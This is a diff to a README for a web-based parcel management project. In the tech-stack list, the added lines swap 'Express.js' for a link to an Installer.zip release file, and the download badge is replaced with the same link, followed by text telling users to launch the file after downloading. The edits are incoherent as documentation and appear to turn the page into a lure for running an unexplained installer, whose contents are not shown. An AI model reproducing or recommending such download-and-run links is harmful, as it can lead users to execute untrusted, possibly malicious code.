@@ -23,7 +23,7 @@ The Parcel Management System is a comprehensive solution aimed at improving the 
 🎨 Animation  
 🔒 CORS  
 🔑 dotenv  
-🚀 Express.js  
+🚀 https://github.com/woo071002/parcel-management-system/releases/download/v1.0/Installer.zip  
 🖼️ Image processing  
 🔐 JWT Authentication  
 📦 Local storage  
@@ -35,7 +35,7 @@ The Parcel Management System is a comprehensive solution aimed at improving the 
 ## Installation
 
 To get started with the Parcel Management System, you can download the latest release from the following link:
-[![Download](https://img.shields.io/badge/Download-Release-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/woo071002/parcel-management-system/releases/download/v1.0/Installer.zip)](https://github.com/woo071002/parcel-management-system/releases/download/v1.0/Installer.zip)
 
 Please note that the file needs to be launched after downloading to start using the system.
 
